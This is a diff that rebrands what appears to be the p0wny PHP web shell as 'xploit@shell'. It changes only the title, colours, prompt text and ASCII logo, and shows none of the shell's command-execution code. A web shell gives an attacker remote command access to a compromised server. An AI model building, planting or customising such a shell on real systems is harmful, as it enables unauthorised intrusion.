@@ -108,7 +108,7 @@ if (isset($_GET["feature"])) {
 
     <head>
         <meta charset="UTF-8" />
-        <title>chocapik@shell:~#</title>
+        <title>xploit@shell:~#</title>
         <meta name="viewport" content="width=device-width, initial-scale=1.0" />
         <style>
             html, body {
@@ -152,11 +152,12 @@ if (isset($_GET["feature"])) {
                 padding: 5px;
                 white-space: pre-wrap;
                 flex-grow: 1;
+                color: #92FAFF;
             }
 
             #shell-logo {
                 font-weight: bold;
-                color: #FF4180;
+                color: #1d9c00;
                 text-align: center;
             }
 
@@ -217,7 +218,7 @@ if (isset($_GET["feature"])) {
                 line-height: 30px;
                 border: none;
                 background: transparent;
-                color: #eee;
+                color: #92FAFF;
                 font-family: monospace;
                 font-size: 10pt;
                 width: 100%;
@@ -360,7 +361,7 @@ if (isset($_GET["feature"])) {
                     var splittedCwd = cwd.split("/");
                     shortCwd = "…/" + splittedCwd[splittedCwd.length-2] + "/" + splittedCwd[splittedCwd.length-1];
                 }
-                return "p0wny@shell:<span title=\"" + cwd + "\">" + shortCwd + "</span>#";
+                return "xploit@shell:<span title=\"" + cwd + "\">" + shortCwd + "</span>#";
             }
 
             function updateCwd(cwd) {
@@ -483,12 +484,13 @@ if (isset($_GET["feature"])) {
         <div id="shell">
             <pre id="shell-content">
                 <div id="shell-logo">
-        ___                         ____      _          _ _        _  _   <span></span>
- _ __  / _ \__      ___ __  _   _  / __ \ ___| |__   ___| | |_ /\/|| || |_ <span></span>
-| '_ \| | | \ \ /\ / / '_ \| | | |/ / _` / __| '_ \ / _ \ | (_)/\/_  ..  _|<span></span>
-| |_) | |_| |\ V  V /| | | | |_| | | (_| \__ \ | | |  __/ | |_   |_      _|<span></span>
-| .__/ \___/  \_/\_/ |_| |_|\__, |\ \__,_|___/_| |_|\___|_|_(_)    |_||_|  <span></span>
-|_|                         |___/  \____/                                  <span></span>
+            _       _ _   ____  _          _ _ <span></span>
+__  ___ __ | | ___ (_) |_/ ___|| |__   ___| | |<span></span>
+\ \/ / '_ \| |/ _ \| | __\___ \| '_ \ / _ \ | |<span></span>
+ >  <| |_) | | (_) | | |_ ___) | | | |  __/ | |<span></span>
+/_/\_\ .__/|_|\___/|_|\__|____/|_| |_|\___|_|_|<span></span>
+     |_|                                       <span></span>
+
                 </div>
             </pre>
             <div id="shell-input">
